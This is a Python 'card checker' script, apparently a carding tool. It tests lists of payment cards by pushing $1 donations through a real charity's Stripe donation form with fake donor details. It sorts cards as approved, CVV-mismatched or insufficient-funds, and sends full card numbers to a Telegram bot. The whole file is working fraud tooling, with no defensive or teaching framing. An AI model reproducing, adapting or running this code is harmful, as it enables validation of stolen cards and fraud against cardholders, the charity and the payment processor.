#!/usr/bin/env python3
"""
Mady Card Checker - Ultimate Edition
Version 1.1.2
Beautiful neon pastel blue/purple UI with enhanced detection
"""

__version__ = "1.1.2"

try:
    import requests
    import re
    import time
    from rich.console import Console
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
    from rich.table import Table
    from rich.live import Live
    from rich.layout import Layout
    from rich import box
    from bs4 import BeautifulSoup
    import os
    import json
    import sqlite3
    from datetime import datetime
    from typing import Dict, Tuple, Optional
except ImportError:
    print("Installing required packages...")
    os.system('pip install requests rich bs4')
    import requests
    import re
    import time
    from rich.console import Console
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
    from rich.table import Table
    from rich.live import Live
    from rich.layout import Layout
    from rich import box
    from bs4 import BeautifulSoup
    import os
    import json
    import sqlite3
    from datetime import datetime
    from typing import Dict, Tuple, Optional

# Initialize Rich console
console = Console()

# Neon pastel blue/purple theme
THEME = {
    'primary': '#A78BFA',      # Purple
    'secondary': '#60A5FA',    # Blue
    'success': '#34D399',      # Green
    'warning': '#FBBF24',      # Yellow
    'error': '#F87171',        # Red
    'info': '#93C5FD',         # Light blue
    'text': '#E0E7FF',         # Light purple-white
}

# Statistics
stats = {
    'total': 0,
    'approved': 0,
    'declined': 0,
    'cvv_mismatch': 0,
    'insufficient_funds': 0,
    'errors': 0,
    'start_time': None
}

# Store results
declined_cards = []

# BIN lookup session
bin_session = requests.Session()
bin_session.headers.update({'User-Agent': 'Mozilla/5.0'})

# Database and config
DB_FILE = 'mady_checker.db'
CONFIG_FILE = 'mady_config.json'


def init_database():
    """Initialize SQLite database"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            start_time TEXT,
            end_time TEXT,
            total_cards INTEGER,
            approved INTEGER,
            declined INTEGER,
            cvv_mismatch INTEGER,
            insufficient_funds INTEGER
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id INTEGER,
            card_number TEXT,
            status TEXT,
            response TEXT,
            gateway TEXT,
            timestamp TEXT,
            bin_info TEXT,
            execution_time REAL,
            FOREIGN KEY (session_id) REFERENCES sessions (id)
        )
    ''')
    
    conn.commit()
    conn.close()


def save_config(token: str, chat_id: str, card_file: str):
    """Save configuration to file"""
    config = {
        'telegram_token': token,
        'chat_id': chat_id,
        'card_file': card_file,
        'last_updated': datetime.now().isoformat()
    }
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=2)


def load_config() -> Optional[Dict]:
    """Load configuration from file"""
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            return None
    return None


def get_bin_info(bin_num: str) -> Dict:
    """Fetch BIN information from API"""
    bin_data = {
        'brand': 'N/A',
        'type': 'N/A',
        'country': 'N/A',
        'bank': 'N/A',
        'flag': '🏳️'
    }
    
    try:
        url = f'https://bins.antipublic.cc/bins/{bin_num}'
        response = bin_session.get(url, timeout=5)
        response.raise_for_status()
        data = response.json()
        
        bin_data['brand'] = str(data.get('brand') or 'N/A').upper()
        bin_data['type'] = str(data.get('type') or 'N/A').upper()
        bin_data['country'] = str(data.get('country_name') or 'N/A')
        bin_data['bank'] = str(data.get('bank') or 'N/A')
        bin_data['flag'] = data.get('country_flag') or '🏳️'
    except:
        pass
    
    return bin_data


def fetch_nonce_and_form_id() -> Tuple[Optional[str], Optional[str]]:
    """Fetch fresh nonce and form ID from donation page"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        }
        
        response = requests.get('https://ccfoundationorg.com/donate/', headers=headers, timeout=10)
        
        if response.status_code != 200:
            return None, None
        
        soup = BeautifulSoup(response.text, 'html.parser')
        
        nonce_input = soup.find('input', {'name': '_charitable_donation_nonce'})
        nonce = nonce_input['value'] if nonce_input else None
        
        form_id_input = soup.find('input', {'name': 'charitable_form_id'})
        form_id = form_id_input['value'] if form_id_input else None
        
        hidden_form_id = soup.find('input', {'type': 'hidden', 'value': lambda x: x and len(x) == 13})
        if hidden_form_id:
            form_id = hidden_form_id['value']
        
        return nonce, form_id
    except:
        return None, None


def validate_card_format(card_line: str) -> bool:
    """Validate card data format"""
    parts = card_line.split('|')
    if len(parts) != 4:
        return False
    
    card_num, month, year, cvv = parts
    
    if not (card_num.isdigit() and 13 <= len(card_num) <= 19):
        return False
    if not (month.isdigit() and 1 <= int(month) <= 12):
        return False
    if not (year.isdigit() and len(year) >= 2):
        return False
    if not (cvv.isdigit() and 3 <= len(cvv) <= 4):
        return False
    
    return True


def analyze_response(response_text: str) -> Tuple[str, str, bool]:
    """Enhanced response analysis with bot.py logic"""
    response_lower = response_text.lower()
    
    # Full success
    if 'requires_action' in response_text or 'success":true' in response_text or 'Thank you' in response_text:
        return "APPROVED", "Full Success", True
    
    # Enhanced CVV detection (11 patterns from bot.py)
    cvv_indicators = [
        'incorrect_cvc', 'invalid_cvc', 'incorrect cvc', 'invalid cvc',
        'security code is incorrect', 'security code is invalid',
        'cvv is incorrect', 'cvc is incorrect',
        "card's security code is incorrect",
        'check the card', 'check card details'
    ]
    
    for indicator in cvv_indicators:
        if indicator in response_lower:
            return "CVV_MISMATCH", "Card Valid - Wrong CVV/CVC", True
    
    # Insufficient funds detection
    if 'insufficient funds' in response_lower or 'insufficient_funds' in response_lower:
        return "INSUFFICIENT_FUNDS", "Card Valid - Insufficient Funds", True
    
    # Parse JSON
    try:
        response_json = json.loads(response_text)
        
        if 'errors' in response_json:
            errors = response_json['errors']
            error_text = ' '.join(errors) if isinstance(errors, list) else str(errors)
            error_lower = error_text.lower()
            
            for indicator in cvv_indicators:
                if indicator in error_lower:
                    return "CVV_MISMATCH", f"Card Valid - Wrong CVV/CVC", True
            
            if 'insufficient funds' in error_lower:
                return "INSUFFICIENT_FUNDS", "Card Valid - Insufficient Funds", True
            
            return "DECLINED", error_text[:100], False
        
        if 'message' in response_json:
            message = response_json['message']
            message_lower = message.lower()
            
            for indicator in cvv_indicators:
                if indicator in message_lower:
                    return "CVV_MISMATCH", f"Card Valid - Wrong CVV/CVC", True
            
            if 'insufficient funds' in message_lower:
                return "INSUFFICIENT_FUNDS", "Card Valid - Insufficient Funds", True
            
            return "DECLINED", message[:100], False
    except:
        pass
    
    return "DECLINED", response_text[:100], False


def normalize_chat_id(chat_id: str) -> str:
    """
    Normalize chat ID for different Telegram forks
    
    Telegram formats:
    - User ID: 123456789 (positive integer, typically 9-10 digits)
    - Group ID: -123456789 (negative integer, typically 9-10 digits)
    - Supergroup/Channel: -100123456789 (starts with -100, 13+ digits total)
    
    Kotatogram formats:
    - User ID: Same as Telegram
    - Group ID: Can use @groupname or numeric ID (same as Telegram)
    - Supergroup: Uses -100 prefix like Telegram
    
    iMe formats:
    - User ID: Same as Telegram
    - Group ID: Same as Telegram
    - Supergroup: Same as Telegram
    
    Note: All Telegram forks use the same Bot API, so ID formats are identical.
    """
    chat_id = str(chat_id).strip()
    
    # Handle username-based IDs (for channels/groups)
    if chat_id.startswith('@'):
        return chat_id
    
    # Handle numeric IDs
    try:
        # Remove any non-numeric characters except minus sign
        numeric_id = ''.join(c for c in chat_id if c.isdigit() or c == '-')
        
        if not numeric_id:
            return chat_id
        
        # Convert to integer to validate
        id_int = int(numeric_id)
        
        # Return as-is - Telegram API handles all formats correctly
        # No conversion needed:
        # - Positive numbers are user IDs
        # - Negative numbers without -100 prefix are regular group IDs
        # - Negative numbers with -100 prefix are supergroup/channel IDs
        return str(id_int)
    except ValueError:
        # If conversion fails, return original
        return chat_id


def send_telegram_message(token: str, chat_id: str, message: str, test_mode: bool = False) -> Tuple[bool, str]:
    """
    Send message to Telegram with support for multiple forks
    
    Supports:
    - Official Telegram
    - Kotatogram (uses same API)
    - iMe (uses same API with different ID formats)
    """
    try:
        # Normalize the chat ID for different Telegram forks
        normalized_id = normalize_chat_id(chat_id)
        
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        data = {
            'chat_id': normalized_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        response = requests.post(url, data=data, timeout=10)
        
        if response.status_code == 200:
            result = response.json()
            if result.get('ok'):
                if test_mode:
                    console.print(f"[{THEME['success']}]✓ Telegram message sent successfully!")
                    console.print(f"[{THEME['info']}]  Message ID: {result.get('result', {}).get('message_id')}")
                    console.print(f"[{THEME['info']}]  Chat ID used: {normalized_id}")
                    
                    # Detect which type of chat
                    chat_type = result.get('result', {}).get('chat', {}).get('type', 'unknown')
                    console.print(f"[{THEME['info']}]  Chat type: {chat_type}")
                return True, "Success"
            else:
                error_desc = result.get('description', 'Unknown error')
                
                # Provide helpful error messages for common issues
                if 'chat not found' in error_desc.lower():
                    return False, f"{error_desc}\n  Tip: Check if the chat ID is correct. For groups, it should start with '-'"
                elif 'bot was blocked' in error_desc.lower():
                    return False, f"{error_desc}\n  Tip: Make sure the bot is not blocked by the user/group"
                elif 'bot is not a member' in error_desc.lower():
                    return False, f"{error_desc}\n  Tip: Add the bot to the group first"
                
                return False, error_desc
        else:
            return False, f"HTTP {response.status_code}"
    except Exception as e:
        return False, str(e)


def create_stats_panel() -> Panel:
    """Create beautiful stats panel"""
    elapsed = time.time() - stats['start_time'] if stats['start_time'] else 0
    processed = stats['approved'] + stats['declined'] + stats['errors']
    
    table = Table(show_header=False, box=box.SIMPLE, padding=(0, 1))
    table.add_column(style=f"{THEME['text']}")
    table.add_column(style=f"bold {THEME['secondary']}")
    
    table.add_row("📊 Total Cards", str(stats['total']))
    table.add_row("⚡ Processed", f"{processed}/{stats['total']}")
    table.add_row("✅ Approved (Full)", str(stats['approved'] - stats['cvv_mismatch'] - stats['insufficient_funds']))
    table.add_row("⚠️  CVV Mismatch", str(stats['cvv_mismatch']))
    table.add_row("💰 Insufficient Funds", str(stats['insufficient_funds']))
    table.add_row("✅ Total Success", str(stats['approved']))
    table.add_row("❌ Declined", str(stats['declined']))
    table.add_row("⚠️  Errors", str(stats['errors']))
    
    if processed > 0:
        success_rate = (stats['approved'] / processed) * 100
        table.add_row("📈 Success Rate", f"{success_rate:.1f}%")
    
    if elapsed > 0:
        speed = processed / elapsed if processed > 0 else 0
        table.add_row("⚡ Speed", f"{speed:.2f} cards/s")
        table.add_row("⏱️  Elapsed", f"{elapsed:.1f}s")
    
    return Panel(
        table,
        title="[bold]📊 Live Statistics[/bold]",
        border_style=THEME['primary'],
        box=box.DOUBLE
    )


def check_card(card_data: str, token: str, chat_id: str) -> bool:
    """Check a single card - ORIGINAL LOGIC PRESERVED"""
    start_time = time.time()
    
    try:
        n, mm, yy, cvc = card_data.split('|')
        yy = yy[-2:]
        bin_num = n[:6]
        
        # Get BIN info
        bin_info = get_bin_info(bin_num)
        
        # Step 1: Create Stripe Payment Method - ORIGINAL LOGIC
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        stripe_data = f'type=card&billing_details[name]=Dievn&billing_details[email]=haowxjds%40gmail.com&billing_details[address][line1]=Kaode5+City&billing_details[address][postal_code]=10080&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=87e42ba5-9910-462d-8b5e-69ea049036fad3667d&muid=e3385f96-ab50-440b-b4fc-62efc795e561fa4880&sid=7163a14d-1ac8-40fe-a426-b5b031f5611f263c50&payment_user_agent=stripe.js%2F014aea9fff%3B+stripe-js-v3%2F014aea9fff%3B+card-element&referrer=https%3A%2F%2Fccfoundationorg.com&time_on_page=88364&key=pk_live_51IGkkVAgdYEhlUBFnXi5eN0WC8T5q7yyDOjZfj3wGc93b2MAxq0RvWwOdBdGIl7enL3Lbx27n74TTqElkVqk5fhE00rUuIY5Lp'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', 
                                headers=stripe_headers, data=stripe_data, timeout=15)
        
        if response.status_code != 200:
            stats['errors'] += 1
            return False
        
        stripe_json = response.json()
        
        if 'error' in stripe_json:
            error_msg = stripe_json['error'].get('message', 'Unknown error')
            stats['declined'] += 1
            declined_cards.append(f"{card_data} - {error_msg}")
            return False
        
        if 'id' not in stripe_json:
            stats['errors'] += 1
            return False
        
        payment_method_id = stripe_json['id']
        
        # Step 2: Fetch fresh nonce - BUG FIX
        nonce, form_id = fetch_nonce_and_form_id()
        
        if not nonce or not form_id:
            stats['errors'] += 1
            return False
        
        # Step 3: Submit donation - ORIGINAL LOGIC
        cookies = {
            'charitable_session': 'c1b961b01bb71fc3f428e8cdfede29ef||86400||82800',
            '__stripe_mid': 'e3385f96-ab50-440b-b4fc-62efc795e561fa4880',
            '__stripe_sid': '7163a14d-1ac8-40fe-a426-b5b031f5611f263c50',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-12-17%2023%3A42%3A25',
            'sbjs_first_add': 'fd%3D2025-12-17%2023%3A42%3A25',
            'sbjs_current': 'typ%3Dtypein',
            'sbjs_first': 'typ%3Dtypein',
            'sbjs_udata': 'vst%3D1',
            'sbjs_session': 'pgs%3D2',
        }
        
        donation_headers = {
            'authority': 'ccfoundationorg.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://ccfoundationorg.com',
            'referer': 'https://ccfoundationorg.com/donate/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        donation_data = {
            'charitable_form_id': form_id,
            form_id: '',
            '_charitable_donation_nonce': nonce,
            '_wp_http_referer': '/donate/',
            'campaign_id': '988003',
            'description': 'CC Foundation Donation Form',
            'ID': '1056420',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'recurring_donation': 'month',
            'title': 'Mr',
            'first_name': 'bodu',
            'last_name': 'Diven',
            'email': 'haowxjds@gmail.com',
            'address': 'Kaode5 City',
            'postcode': '10080',
            'gateway': 'stripe',
            'stripe_payment_method': payment_method_id,
            'action': 'make_donation',
            'form_action': 'make_donation',
        }
        
        donation_response = requests.post('https://ccfoundationorg.com/wp-admin/admin-ajax.php', 
                                         cookies=cookies, headers=donation_headers, 
                                         data=donation_data, timeout=15)
        
        execution_time = time.time() - start_time
        
        # Enhanced response analysis
        status, message, is_success = analyze_response(donation_response.text)
        
        if is_success:
            if status == "CVV_MISMATCH":
                stats['cvv_mismatch'] += 1
                status_emoji = "⚠️"
                status_text = "CVV MISMATCH (Card Valid!)"
            elif status == "INSUFFICIENT_FUNDS":
                stats['insufficient_funds'] += 1
                status_emoji = "💰"
                status_text = "INSUFFICIENT FUNDS (Card Valid!)"
            else:
                status_emoji = "✅"
                status_text = "APPROVED"
            
            stats['approved'] += 1
            
            # Enhanced Telegram message with Mady branding
            telegram_message = f"""<b>{status_emoji} {status_text}
━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ⇾ <code>{card_data}</code>
[↯] 𝗚𝗔𝗧𝗘: Stripe Charge $1.00
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: {message}
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡: {bin_num}
[↯] 𝗜𝗡𝗙𝗢: {bin_info['brand']} - {bin_info['type']}
[↯] 𝗕𝗔𝗡𝗞: {bin_info['bank']}
[↯] 𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {bin_info['country']} {bin_info['flag']}
━━━━━━━━━━━━━━━━
[↯] 𝗧𝗜𝗠𝗘: {execution_time:.2f}s
[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾ Mady Checker</b>"""
            
            # Try to send Telegram message with retry logic
            max_retries = 3
            for attempt in range(max_retries):
                tg_success, tg_msg = send_telegram_message(token, chat_id, telegram_message)
                if tg_success:
                    console.print(f"[{THEME['success']}]  ✓ Telegram notification sent")
                    break
                else:
                    if attempt < max_retries - 1:
                        console.print(f"[{THEME['warning']}]  ⚠ Telegram send failed (attempt {attempt + 1}/{max_retries}): {tg_msg}")
                        console.print(f"[{THEME['info']}]  Retrying in 2 seconds...")
                        time.sleep(2)
                    else:
                        console.print(f"[{THEME['error']}]  ✗ Telegram notification failed after {max_retries} attempts: {tg_msg}")
                        console.print(f"[{THEME['warning']}]  Card result saved locally but notification not sent")
            
            return True
        else:
            stats['declined'] += 1
            declined_cards.append(f"{card_data} - {message}")
            return False
            
    except Exception as e:
        stats['errors'] += 1
        return False


def main():
    """Main function with beautiful UI"""
    console.clear()
    
    # Header with Mady branding
    header = Panel(
        "[bold]✨ Mady Card Checker ✨[/bold]",
        style=f"bold {THEME['primary']}",
        box=box.DOUBLE
    )
    console.print(header)
    
    # Initialize database
    init_database()
    
    # Load or get config
    config = load_config()
    
    if config:
        console.print(f"\n[{THEME['info']}]📁 Found saved configuration")
        use_saved = console.input(f"[{THEME['secondary']}]Use saved config? (y/n): [/]").lower()
        
        if use_saved == 'y':
            token = config['telegram_token']
            chat_id = config['chat_id']
            file_path = config['card_file']
            console.print(f"[{THEME['success']}]✓ Loaded saved configuration")
        else:
            token = console.input(f"[{THEME['secondary']}]Enter Telegram Bot Token: [/]")
            chat_id = console.input(f"[{THEME['secondary']}]Enter Chat ID: [/]")
            file_path = console.input(f"[{THEME['secondary']}]Enter Card File Path: [/]")
            save_config(token, chat_id, file_path)
            console.print(f"[{THEME['success']}]✓ Configuration saved")
    else:
        token = console.input(f"[{THEME['secondary']}]Enter Telegram Bot Token: [/]")
        chat_id = console.input(f"[{THEME['secondary']}]Enter Chat ID: [/]")
        file_path = console.input(f"[{THEME['secondary']}]Enter Card File Path: [/]")
        save_config(token, chat_id, file_path)
        console.print(f"[{THEME['success']}]✓ Configuration saved")
    
    # Test Telegram
    console.print(f"\n[{THEME['info']}]🧪 Testing Telegram connection...")
    test_msg = "<b>🧪 TEST MESSAGE\n━━━━━━━━━━━━━━━━\nMady Checker is ready!\n✅ Connection Successful</b>"
    success, msg = send_telegram_message(token, chat_id, test_msg, test_mode=True)
    
    if not success:
        console.print(f"[{THEME['error']}]✗ Telegram test failed: {msg}")
        if console.input(f"[{THEME['warning']}]Continue anyway? (y/n): [/]").lower() != 'y':
            return
    
    # Load cards
    if not os.path.exists(file_path):
        console.print(f"[{THEME['error']}]✗ File not found: {file_path}")
        return
    
    with open(file_path, 'r') as f:
        cards = [line.strip() for line in f if line.strip() and validate_card_format(line.strip())]
    
    if not cards:
        console.print(f"[{THEME['error']}]✗ No valid cards found")
        return
    
    stats['total'] = len(cards)
    stats['start_time'] = time.time()
    
    console.print(f"\n[{THEME['success']}]✓ Loaded {len(cards)} valid cards\n")
    
    # Process cards with live stats
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TaskProgressColumn(),
        console=console
    ) as progress:
        
        task = progress.add_task(f"[{THEME['secondary']}]Processing cards...", total=len(cards))
        
        for i, card in enumerate(cards, 1):
            progress.update(task, advance=1, description=f"[{THEME['secondary']}]Card {i}/{len(cards)}: {card[:6]}...")
            
            check_card(card, token, chat_id)
            
            # Show stats every 5 cards
            if i % 5 == 0 or i == len(cards):
                console.print(create_stats_panel())
            
            if i < len(cards):
                time.sleep(5)
    
    # Final summary
    console.print("\n")
    console.print(create_stats_panel())
    
    # Declined cards
    if declined_cards:
        declined_table = Table(title="❌ Declined Cards", box=box.DOUBLE, border_style=THEME['error'])
        declined_table.add_column("Card", style=THEME['text'])
        declined_table.add_column("Reason", style=THEME['error'])
        
        for card in declined_cards[:10]:  # Show first 10
            parts = card.split(' - ', 1)
            declined_table.add_row(parts[0], parts[1] if len(parts) > 1 else 'Unknown')
        
        console.print(declined_table)
        
        if len(declined_cards) > 10:
            console.print(f"[{THEME['warning']}]... and {len(declined_cards) - 10} more")
    
    console.print(f"\n[{THEME['success']}]✨ Processing complete! - Powered by Mady")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print(f"\n[{THEME['warning']}]⚠️  Interrupted by user")
    except Exception as e:
        console.print(f"\n[{THEME['error']}]💥 Error: {e}")
